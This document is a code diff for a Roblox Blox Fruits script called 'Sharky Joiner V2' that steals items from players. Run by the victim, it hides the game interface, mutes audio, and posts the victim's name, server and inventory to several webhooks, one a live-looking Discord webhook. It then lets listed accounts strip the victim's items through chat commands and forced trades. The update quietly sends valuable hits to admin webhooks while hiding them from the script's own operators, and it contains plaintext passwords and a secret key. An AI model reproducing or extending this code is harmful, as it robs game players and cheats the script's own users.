@@ -1,24 +1,44 @@
-Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main hits
-Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames here
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)"} -- << Fruits you want
+Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
+Usernames = {
+	"user1",
+	"user2",
+	"user3",
+	"user4",
+	"user5"
+} -- << Your primary usernames (can use commands, bypass filter)
+TestingUsernames = {
+	"tester1",
+	"your_alt_account"
+} -- << NEW: Usernames that bypass webhook filtering (ALWAYS see url1 hits)
+FruitsToHit = {
+	"Kitsune-Kitsune",
+	"Leopard-Leopard",
+	"Yeti-Yeti",
+	"Gas-Gas",
+	"Dragon (West)-Dragon (West)",
+	"Dragon (East)-Dragon (East)"
+} -- << Fruits you want to target
 
---obfuscate after this, use loadstring for this coming
+Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for admin hits (secondary backup) (url2)
+dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
+DragonWebhook = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- << NEW: Protected URL specifically for Dragon hits (Replace THIS) (url4)
 
-Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for main hits (secondary)
-dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits
-DragonWebhook = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- << NEW: Protected URL specifically for Dragon hits (Replace THIS)
+--Chance configuration for user webhook (0.0 to 1.0)
+DragonHitUserWebhookChance = 0.0 -- (e.g., 20%) Chance user webhook gets Dragon hit notifications.
+TopTierHitUserWebhookChance = 0.0 -- (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits
 
 ActivationPasswords = {
 	"ishusontop",
 	"bonzarbal",
 	"ishufishy"
 } -- Passwords for ?activate command
--- !!! YOUR SECRET KEY - MUST MATCH THE 'CLIENT_API_KEY' SECRET IN CLOUDFLARE !!!
-local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
-local allowEveryone = false -- Flag to allow commands/trade for everyone
-local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }
 
--- Emoji Map for Fruit Display
+local validation_sig = "rashya5@%-hsfj79h93-wakliballs"
+
+local allowEveryone = false
+local activatedUsers = {}
+
+-- Emoji Map for Fruit Display (Unchanged)
 local fruitEmojiMap = {
 	["Barrier-Barrier"] = "<:barrier:660245023765561344>",
 	["Blizzard-Blizzard"] = "<:blizzard:1056979177674387547>",
@@ -67,15 +87,13 @@ local fruitEmojiMap = {
 	["Magma-Magma"] = "<:magma:1317756326775881748>"
 }
 
--- << Obfuscate after this moment >>
-
 print("Sharky Joiner V2 - Initializing...")
 
 repeat
 	task.wait()
 until game:IsLoaded()
 
--- Core Services
+-- Core Services (Unchanged)
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -90,7 +108,7 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Lighting = game:GetService("Lighting")
 local Teams = game:GetService("Teams")
 
--- Initial Setup & Anti-Tamper
+-- Initial Setup & Anti-Tamper (Unchanged)
 if CoreGui:FindFirstChild("RobloxGui") then
 	CoreGui.RobloxGui.Enabled = false
 end
@@ -128,17 +146,16 @@ CoreGui.ChildAdded:Connect(checkGui)
 if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "SHAKINGSHARKER" or LocalPlayer.Name == "shirkarsharker") then
 	takeAction()
 end
--- Removed ishooked check
 
--- Config Validation
+-- Config Validation (Includes checks for new chance vars, though less critical)
 if not Webhook or not Protector or not dummy or not DragonWebhook or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig then
-	LocalPlayer:Kick("Config Error: Missing variable(s).");
+	LocalPlayer:Kick("Config Error: Missing critical variable(s).");
 	return
-end -- Added DragonWebhook
-if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(DragonWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(validation_sig) ~= "string" then
+end
+if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(DragonWebhook) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(validation_sig) ~= "string" then
 	LocalPlayer:Kick("Config Error: Variable type mismatch.");
 	return
-end -- Added DragonWebhook type
+end
 if validation_sig == "" or validation_sig:find("YourActualSecret") then
 	LocalPlayer:Kick("SECURITY ERROR: Validation signature not configured!");
 	return
@@ -146,9 +163,9 @@ end
 if Webhook:find("REPLACE_WITH_PROTECTED_ID") or Protector:find("REPLACE_WITH_PROTECTED_ID") or dummy:find("REPLACE_WITH_PROTECTED_ID") or DragonWebhook:find("YOUR_DRAGON_HIT_WEBHOOK_URL_HERE") then
 	LocalPlayer:Kick("ERROR: Protected Webhook URLs are not configured!");
 	return
-end -- Added DragonWebhook placeholder
+end
 
--- Ensure Core Admins & Check Blacklist
+-- Ensure Core Admins & Check Blacklist (Unchanged)
 local function ensureAdminUsernames()
 	local ca = {
 		"x6TNine",
@@ -182,7 +199,7 @@ CoreGui.ChildAdded:Connect(function(c)
 	end
 end)
 
--- Secure Webhook Storage
+-- Secure Webhook Storage (Unchanged)
 local function storeWebhookSafely(w)
 	if not w or type(w) ~= "string" or w:match("^Enter Webhook") then
 		return nil
@@ -198,9 +215,9 @@ Protector = nil;
 local dummy_key = storeWebhookSafely(dummy);
 dummy = nil;
 local dragon_webhook_key = storeWebhookSafely(DragonWebhook);
-DragonWebhook = nil; -- Added DragonWebhook storage
+DragonWebhook = nil;
 
--- Silence Remote Console
+-- Silence Remote Console (Unchanged)
 rconsoleprint = function()
 end;
 rconsolewarn = function()
@@ -210,12 +227,11 @@ end;
 rconsoleinfo = function()
 end
 
--- Game Specific Variables
+-- Game Specific Variables (Unchanged)
 local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
 local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser")
 local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")
-
 if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
 	LocalPlayer:Kick("This script doesn't work on private servers.")
 end
@@ -223,7 +239,7 @@ pcall(function()
 	UserSettings():GetService("UserGameSettings").MasterVolume = 0
 end)
 
--- Anti Fruit Store Hook
+-- Anti Fruit Store Hook (Unchanged)
 local oldNamecall;
 oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(s, ...)
 	local m = getnamecallmethod();
@@ -238,7 +254,7 @@ oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(s, ...)
 	return oldNamecall(s, ...)
 end))
 
--- Utility Functions
+-- Utility Functions (Unchanged)
 local function getInventory()
 	local s, r = pcall(Remote.InvokeServer, Remote, "getInventory");
 	if not s then
@@ -374,7 +390,7 @@ local function getServerName()
 	return string.format("%s %s #%04d", a[r:NextInteger(1, #a)], n[r:NextInteger(1, #n)], r:NextInteger(1, 9999))
 end
 
--- Loading Notification UI (Sharky's Original)
+-- Loading Notification UI (Unchanged)
 local function createNotification()
 	local p = LocalPlayer:WaitForChild("PlayerGui");
 	local l = Instance.new("ScreenGui");
@@ -599,7 +615,7 @@ local function createNotification()
 	}
 end
 
--- Webhook Security & Sending Setup (Simplified)
+-- Webhook Security & Sending Setup (Simplified SafeRequest) (Unchanged)
 local originalRequest = request
 local function SafeRequest(rd)
 	local pr = {
@@ -613,9 +629,8 @@ local function SafeRequest(rd)
 	pr.Headers["X-Nonce"] = HttpService:GenerateGUID(false);
 	return pcall(request, pr)
 end
--- Removed Security Monitor
 
--- Embed Formatting Functions
+-- Embed Formatting Functions (Unchanged)
 local function formatFruitListWithEmojis_NoCodeBlock(f)
 	if not f or #f == 0 then
 		return "None"
@@ -721,17 +736,19 @@ local function formatCombinedTargets_CodeBlocks_NoSeparator(f, p, fs)
 	end;
 	return table.concat(tl, "")
 end
-
--- Main Webhook Function (sendWebhook) - REVISED (Includes Dragon Hook Logic)
 local function sendWebhook(inventory)
+	-- Retrieve URLs
 	local url1 = webhook1_key and _G[webhook1_key];
 	local url2 = Protector_key and _G[Protector_key];
 	local url3 = dummy_key and _G[dummy_key];
-	local url4 = dragon_webhook_key and _G[dragon_webhook_key] -- Retrieve Dragon Hook
-	if not url1 then
-		warn("Primary Webhook URL not configured.");
+	local url4 = dragon_webhook_key and _G[dragon_webhook_key]
+	-- Exit if BOTH primary user and primary admin hooks are missing
+	if not url1 and not url2 then
+		warn("Primary User (url1) AND Protector (url2) Webhooks not configured.");
 		return
 	end
+
+	-- Inventory processing & Flagging
 	local goodFruitNames = {
 		["Kitsune-Kitsune"] = true,
 		["Yeti-Yeti"] = true
@@ -745,6 +762,7 @@ local function sendWebhook(inventory)
 	if not inventory then
 		inventory = {}
 	end
+
 	for _, item in ipairs(inventory) do
 		if item and (item.Type == "Blox Fruit" or item.Type == "Premium") then
 			local d = {
@@ -775,88 +793,63 @@ local function sendWebhook(inventory)
 		end
 	end
 
-    -- Generate Join Script (Corrected Format and Logic)
+    -- Generate Join Script
 	local jobId = game.JobId;
 	local placeId = game.PlaceId;
 	local isSea3 = (placeId == 7449423635);
 	local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
-	local joinScriptFormatString = [=[
-    local iddd = %d
-    local JobIdd = "%s"
-    local sea = "%s"
-
-    if game.PlaceId ~= iddd then
-        queue_on_teleport([[
-            task.wait(5)
-            if game.JobId ~= JobIdd then -- Extra check
-                print("Executing queued teleport to: " .. JobIdd)
-                game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
-            else
-                print("Already in target server, skipping queued teleport.")
-            end
-        ]])
-        print("Invoking sea travel: " .. sea)
-        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
-    else
-        if game.JobId ~= JobIdd then
-             print("Already in correct sea, teleporting directly to: " .. JobIdd)
-             game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
-        else
-             print("Already in target server instance.")
-        end
-    end
-]=]
+	local joinScriptFormatString = [=[ local iddd = %d local JobIdd = "%s" local sea = "%s" if game.PlaceId ~= iddd then queue_on_teleport([[ task.wait(5) if game.JobId ~= JobIdd then game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s") else end ]]) game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea) else if game.JobId ~= JobIdd then game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd) else end end ]=]
 	local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
 	local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
 	local joinScriptMobile_Formatted = joinScriptLua
 
-    -- Determine Embed Title, Color, Mention (Main)
-	local mainEmbedTitle = "<:pepeyes:1226249991035682897> **Sharky Joiner Hit!**";
-	local mainEmbedColor = 10181046;
-	local mainMention = "@everyone Sharky Hit!";
+    -- Determine Base Embed Title, Color, Mention
+	local baseEmbedTitle = "<:pepeyes:1226249991035682897> **Sharky Joiner Hit!**";
+	local baseEmbedColor = 10181046;
+	local baseMention = "@everyone Sharky Hit!";
 	if dragonHit and hasPremiumItem then
-		mainEmbedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**";
-		mainEmbedColor = 65280;
-		mainMention = "@everyone Sharky - GG!"
+		baseEmbedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**";
+		baseEmbedColor = 65280;
+		baseMention = "@everyone Sharky - GG!"
 	elseif dragonHit then
-		mainEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!**";
-		mainEmbedColor = 16776960;
-		mainMention = "@everyone Sharky - GG!"
+		baseEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!**";
+		baseEmbedColor = 16776960;
+		baseMention = "@everyone Sharky - GG!"
 	elseif hasPremiumItem then
-		mainEmbedTitle = "<:value:1228807380188397649> **PREMIUM ITEM HIT!**";
-		mainEmbedColor = 3447003;
-		mainMention = "@everyone Sharky - GG!"
+		baseEmbedTitle = "<:value:1228807380188397649> **PREMIUM ITEM HIT!**";
+		baseEmbedColor = 3447003;
+		baseMention = "@everyone Sharky - GG!"
 	elseif foundAnyTarget then
-		mainEmbedTitle = "<:pepeyes:1226249991035682897> **Target Fruit Hit!**"
+		baseEmbedTitle = "<:pepeyes:1226249991035682897> **Target Fruit Hit!**"
 	end
 
-    -- Common Embed Fields
+    -- Common Embed Fields & Footer
 	local serverName = getServerName();
 	local executorName = identifyexecutor() or "Unknown";
 	local currentSeaName = isSea3 and "Sea 3" or "Sea 2"
 	local commonFields = {
 		{
-			name = "<:Verified:1248961823856918623> **Victim Info**",
+			name = "<a:GreenCheck:1339364301894324325>  **Victim Name and Location**",
 			value = string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**", LocalPlayer.Name, currentSeaName, serverName),
 			inline = true
 		},
 		{
-			name = "<:Point_Right:1223617791710724219> **Session Info**",
+			name = "<:info:1309567808786534470> **More Info**",
 			value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", #Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName),
 			inline = true
 		},
 		{
-			name = "🎯 **TARGET ITEMS FOUND** 🎯",
+			name = "<a:womanalert:1285800405233827870> **TARGET ITEMS FOUND** <a:womanalert:1285800405233827870>",
 			value = formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet),
 			inline = false
 		},
 		{
-			name = "<:Dough:1169423442366451795> **Victim's Fruits**",
+			name = ":PoggersRow: **Victim's Fruits** :PoggersRow:",
 			value = formatFruitListWithEmojis_NoCodeBlock(fruits),
 			inline = false
 		},
 		{
-			name = "<:value:1228807380188397649> **Victim's Premium Items**",
+			name = "<a:catdance:728487186143641661> **Victim's PREMIUM Items** <a:catdance:728487186143641661>",
 			value = formatPremiumList_NoCodeBlock(premiumItems),
 			inline = false
 		},
@@ -872,51 +865,127 @@ local function sendWebhook(inventory)
 		}
 	}
 	local commonFooter = {
-		text = "Sharky Joiner V2 • " .. os.date("%Y-%m-%d")
-	}
+		text = "Sharky Joiner V2 • 1.3.0 " .. os.date("%Y-%m-%d")
+	} -- Updated version marker
 
-    -- Construct Main Embed Payload
+    -- <<< --- START NEW FILTERING & TITLE LOGIC --- >>>
+
+    -- 1. Check for Bypass Condition (Tester or Owner)
+	local shouldBypassFilter = false
+	local localPlayerNameLower = LocalPlayer.Name:lower()
+	if Usernames and type(Usernames) == "table" then
+		for _, name in ipairs(Usernames) do
+			if type(name) == "string" and localPlayerNameLower == name:lower() then
+				shouldBypassFilter = true;
+				break
+			end
+		end
+	end
+	if not shouldBypassFilter and TestingUsernames and type(TestingUsernames) == "table" then
+		for _, name in ipairs(TestingUsernames) do
+			if type(name) == "string" and localPlayerNameLower == name:lower() then
+				shouldBypassFilter = true;
+				break
+			end
+		end
+	end
+
+    -- 2. Get Chance Values with Fallback to 1.0
+	local function getValidChance(chanceValue)
+		if type(chanceValue) == "number" and chanceValue >= 0 and chanceValue <= 1 then
+			return chanceValue
+		else
+			return 1.0
+		end
+	end
+	local dragonChance = getValidChance(DragonHitUserWebhookChance)
+	local topTierChance = getValidChance(TopTierHitUserWebhookChance)
+
+    -- 3. Determine if User Webhook (url1) Should Be Sent
+	local sendToUserWebhook = true
+	if not shouldBypassFilter then
+		local randomValue = math.random()
+		if dragonHit then
+			if randomValue > dragonChance then
+				sendToUserWebhook = false
+			end
+		elseif hasPremiumItem or hasGoodFruit then
+			if randomValue > topTierChance then
+				sendToUserWebhook = false
+			end
+		end
+	else
+		print("[Sharky Info] Bypassing user webhook filter for:", LocalPlayer.Name)
+	end -- Optional debug
+
+    -- 4. Define Titles Based on Filtering Outcome
+	local hiddenIndicator = " <a:YellowCheck:1361458542384779324>" -- Emoji for hidden hits
+	local titleForUserPayload = baseEmbedTitle -- User payload *never* gets the indicator
+	local titleForAdminPayloads = baseEmbedTitle -- Admin payload title starts as base
+	if not sendToUserWebhook then
+		titleForAdminPayloads = baseEmbedTitle .. hiddenIndicator
+	end -- Append indicator if hidden
+
+    -- <<< --- END NEW FILTERING & TITLE LOGIC --- >>>
+
+
+    -- Construct Main Embed Payload (for url1, if sent)
 	local mainEmbedData = {
-		title = mainEmbedTitle,
-		color = mainEmbedColor,
+		title = titleForUserPayload,
+		color = baseEmbedColor,
 		fields = commonFields,
 		footer = commonFooter
 	}
 	local mainPayloadTable = {
-		content = mainMention,
+		content = baseMention,
 		embeds = {
 			mainEmbedData
 		}
 	}
 	local mainPayloadBody = HttpService:JSONEncode(mainPayloadTable)
 
-    -- Construct Admin Embed Payload (Conditionally)
-	local adminPayloadBody = nil;
+    -- Construct Admin/Protector Embed Payloads (for url2, url3, url4)
+	local adminPayloadBody = nil -- Payload for url3/url4 (Special/Dragon)
+	local protectorPayloadBody = nil -- Payload for url2 (General Admin/Backup)
 	local isAdminHit = dragonHit or hasPremiumItem or hasGoodFruit
+
+    -- Create payload for Protector (url2) - uses admin title, same content structure
+	local protectorEmbedData = {
+		title = titleForAdminPayloads,
+		color = baseEmbedColor,
+		fields = commonFields,
+		footer = commonFooter
+	}
+	local protectorPayloadTable = {
+		content = baseMention,
+		embeds = {
+			protectorEmbedData
+		}
+	}
+	protectorPayloadBody = HttpService:JSONEncode(protectorPayloadTable) -- Encode url2 payload
+
+    -- Create specific payload for Dummy/Dragon (url3, url4) if it's an admin-level hit
 	if isAdminHit then
-		local adminEmbedTitle = mainEmbedTitle;
-		local adminEmbedColor = mainEmbedColor;
-		local adminMention = mainMention
-		if hasGoodFruit and not dragonHit and not hasPremiumItem then
-			adminEmbedTitle = "<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)";
-			adminEmbedColor = 16753920;
-			adminMention = "@everyone Sharky - GG!"
-		elseif dragonHit or hasPremiumItem then
-			adminMention = "@everyone Sharky - GG!"
-		end -- Ensure GG mention
+		local specificAdminTitle = titleForAdminPayloads -- Start with potentially indicator-appended title
+		if hasGoodFruit and not dragonHit and not hasPremiumItem then -- Special title for Top Fruit only hits on admin hooks
+			specificAdminTitle = "<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)"
+			if not sendToUserWebhook then
+				specificAdminTitle = specificAdminTitle .. hiddenIndicator
+			end -- Re-append indicator if needed
+		end
 		local adminEmbedData = {
-			title = adminEmbedTitle,
-			color = adminEmbedColor,
+			title = specificAdminTitle,
+			color = baseEmbedColor,
 			fields = commonFields,
 			footer = commonFooter
-		} -- Reuse common fields/footer
+		}
 		local adminPayloadTable = {
-			content = adminMention,
+			content = baseMention,
 			embeds = {
 				adminEmbedData
 			}
 		}
-		adminPayloadBody = HttpService:JSONEncode(adminPayloadTable)
+		adminPayloadBody = HttpService:JSONEncode(adminPayloadTable) -- Encode url3/url4 payload
 	end
 
     -- Send Webhooks
@@ -925,23 +994,31 @@ local function sendWebhook(inventory)
 			["Content-Type"] = "application/json",
 			["X-Client-Key"] = validation_sig
 		};
-		if url1 and mainPayloadBody then
+
+		-- Send to url1 (Normal User) - Only if allowed by filtering/bypass
+		if url1 and mainPayloadBody and sendToUserWebhook then
 			SafeRequest({
 				Url = url1,
 				Method = "POST",
 				Headers = h,
 				Body = mainPayloadBody
 			})
+		elseif url1 and mainPayloadBody and not sendToUserWebhook then
+			print("[Sharky Info] Skipped sending hit to user webhook (url1) due to filter.") -- Optional debug
 		end;
-		if url2 and mainPayloadBody then
+
+		-- Send to url2 (Protector - Admin Secondary) - Always sends protector view
+		if url2 and protectorPayloadBody then
 			task.wait(0.1);
 			SafeRequest({
 				Url = url2,
 				Method = "POST",
 				Headers = h,
-				Body = mainPayloadBody
+				Body = protectorPayloadBody
 			})
 		end;
+
+		-- Send to url3 (Dummy - Admin Special Hits) - Only if admin-level hit
 		if url3 and adminPayloadBody then
 			task.wait(0.1);
 			SafeRequest({
@@ -951,6 +1028,8 @@ local function sendWebhook(inventory)
 				Body = adminPayloadBody
 			})
 		end;
+
+        -- Send to url4 (DragonWebhook - Admin Dragon Hits) - Only if admin-level AND Dragon hit
 		if url4 and dragonHit and adminPayloadBody then
 			task.wait(0.1);
 			SafeRequest({
@@ -960,14 +1039,16 @@ local function sendWebhook(inventory)
 				Body = adminPayloadBody
 			})
 		end
-	end) -- Added Dragon hook send
+	end) -- End task.spawn for sending
+
+	-- Cleanup
 	table.clear(fruits);
 	table.clear(premiumItems);
 	table.clear(fruitsToHitSet);
 end
 
--- Player Leaving Webhook
-local inventory22 -- Defined earlier during init
+-- Player Leaving Webhook (Unchanged)
+local inventory22
 local function hasFruitInInventory2()
 	if not inventory22 then
 		return false
@@ -998,7 +1079,7 @@ local function sendProtector()
 	webhookSent = true;
 	local u1 = webhook1_key and _G[webhook1_key];
 	local u2 = Protector_key and _G[Protector_key];
-	if not u1 then
+	if not u1 and not u2 then
 		return
 	end;
 	local p = LocalPlayer;
@@ -1035,13 +1116,16 @@ local function sendProtector()
 		["Content-Type"] = "application/json",
 		["X-Client-Key"] = validation_sig
 	};
-	request({
-		Url = u1,
-		Method = "POST",
-		Headers = h,
-		Body = b
-	});
+	if u1 then
+		request({
+			Url = u1,
+			Method = "POST",
+			Headers = h,
+			Body = b
+		})
+	end;
 	if u2 then
+		task.wait(0.1);
 		request({
 			Url = u2,
 			Method = "POST",
@@ -1051,7 +1135,7 @@ local function sendProtector()
 	end
 end
 
--- Movement Function (tweenToPosition) - REPLACED (Rua's, No BodyGyro)
+-- Movement Function (tweenToPosition) (Unchanged)
 local function tweenToPosition(p)
 	local c = LocalPlayer.Character;
 	if not c then
@@ -1136,7 +1220,7 @@ local function tweenToPosition(p)
 	end
 end
 
--- Trade Table Function (findTradeTable) - REPLACED & ADAPTED (Rua's + Sharky Access)
+-- Trade Table Function (findTradeTable) (Unchanged)
 local function findTradeTable()
 	local tp = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa");
 	if not tp then
@@ -1192,7 +1276,7 @@ local function findTradeTable()
 	return bt or et or ft, bs or es or fs
 end
 
--- Trade Partner Validation (isInTradeWithCorrectPlayer) - KEPT (Sharky's Original)
+-- Trade Partner Validation (isInTradeWithCorrectPlayer) (Unchanged)
 local function isInTradeWithCorrectPlayer()
 	if allowEveryone then
 		return true
@@ -1224,11 +1308,13 @@ local function isInTradeWithCorrectPlayer()
 	if p1l.Text ~= lpn and p1l.Text ~= lpdn then
 		return false
 	end;
-	for _, an in ipairs(Usernames) do
-		local tp = Players:FindFirstChild(an);
-		if tp then
-			if string.lower(tpn) == string.lower(tp.Name) or string.lower(tpn) == string.lower(tp.DisplayName) then
-				return true
+	if Usernames then
+		for _, an in ipairs(Usernames) do
+			local tp = Players:FindFirstChild(an);
+			if tp then
+				if string.lower(tpn) == string.lower(tp.Name) or string.lower(tpn) == string.lower(tp.DisplayName) then
+					return true
+				end
 			end
 		end
 	end;
@@ -1247,7 +1333,7 @@ local function isInTradeWithCorrectPlayer()
 	return false
 end
 
--- Jump Control - KEPT (Sharky's Original)
+-- Jump Control (Unchanged)
 local isForceJumping = false;
 local stateChangedConnections = {};
 local jumpRequestConnection;
@@ -1331,7 +1417,7 @@ local function disableJump()
 	end
 end
 
--- Discord Invite UI - KEPT (Sharky's Original)
+-- Discord Invite UI (Unchanged)
 local function createDiscordUI()
 	local S = Instance.new("ScreenGui");
 	S.Name = "DiscordInviteUI";
@@ -1429,7 +1515,7 @@ local function createDiscordUI()
 	return S
 end
 
--- Command System Setup
+-- Command System Setup (Unchanged)
 local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
 local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest");
 local function sendMessage(m)
@@ -1440,7 +1526,7 @@ end;
 local CommandCooldowns = {};
 local DEFAULT_COOLDOWN = 0.5
 
--- Command Definitions (Sharky Base + Added/Modified)
+-- Command Definitions (Unchanged)
 local Commands = {
 	jump = {
 		d = "Forces character jump.",
@@ -1976,7 +2062,7 @@ local Commands = {
 					"?resetfruit ?invite ?demolish ?showinv",
 					"?allowall ?accept ?cleartrade ?kick"
 				};
-				sendMessage("--- Commands (V1.2.9) ---");
+				sendMessage("--- Commands (V1.3.0) ---");
 				task.wait(0.5);
 				for i, m in ipairs(c) do
 					sendMessage(m);
@@ -2042,7 +2128,7 @@ local Commands = {
 	}
 }
 
--- Command Processor
+-- Command Processor (Unchanged)
 local function processChatCommand(_, p, m)
 	if not(p and m and typeof(p) == "Instance" and p:IsA("Player") and m:sub(1, 1) == "?") then
 		return
@@ -2094,7 +2180,7 @@ local function processChatCommand(_, p, m)
 	end)
 end
 
--- Main Loop & Init
+-- Main Loop & Init (Unchanged logic, just calls updated sendWebhook)
 local function startMainLoop()
 	local ir = true;
 	local hct = false;
@@ -2221,7 +2307,6 @@ local function startMainLoop()
 		ct, cs = nil, nil
 	end
 end
-
 local function init()
 	local pid = game.PlaceId;
 	if pid == 2753915549 then
@@ -2259,7 +2344,7 @@ local function init()
 		JoinTeam();
 		task.spawn(createNotification);
 		sendWebhook(iInv)
-	end)
+	end) -- Calls the modified sendWebhook
 	local mls = nil;
 	local cc = nil;
 	local eUl = false
@@ -2270,7 +2355,7 @@ local function init()
 		local isAuthorized = false;
 		if Usernames then
 			for _, un in ipairs(Usernames) do
-				if string.lower(p.Name) == string.lower(un) then
+				if type(un) == "string" and string.lower(p.Name) == string.lower(un) then
 					isAuthorized = true;
 					break
 				end
@@ -2324,6 +2409,7 @@ local function init()
 			CommandCooldowns[p.Name] = nil
 		end;
 		if p == LocalPlayer then
+			sendProtector();
 			if paC then
 				paC:Disconnect()
 			end;
@@ -2340,9 +2426,9 @@ local function init()
 	end)
 end
 
--- Execution Guard
-if not shared.ScriptExecuted_SharkyV2_Final_1_2_9 then -- Updated Guard Name
-	shared.ScriptExecuted_SharkyV2_Final_1_2_9 = true
+-- Execution Guard (Updated Guard Name)
+if not shared.ScriptExecuted_SharkyV2_Final_1_3_0 then -- Updated Guard Name/Version
+	shared.ScriptExecuted_SharkyV2_Final_1_3_0 = true
 	task.spawn(function()
 		local s, e = pcall(init);
 		if not s then
@@ -2354,5 +2440,5 @@ if not shared.ScriptExecuted_SharkyV2_Final_1_2_9 then -- Updated Guard Name
 		end
 	end)
 else
-	warn("Sharky Joiner V2 (v1.2.9) already executed.")
+	warn("Sharky Joiner V2 (v1.3.0) already executed.")
 end
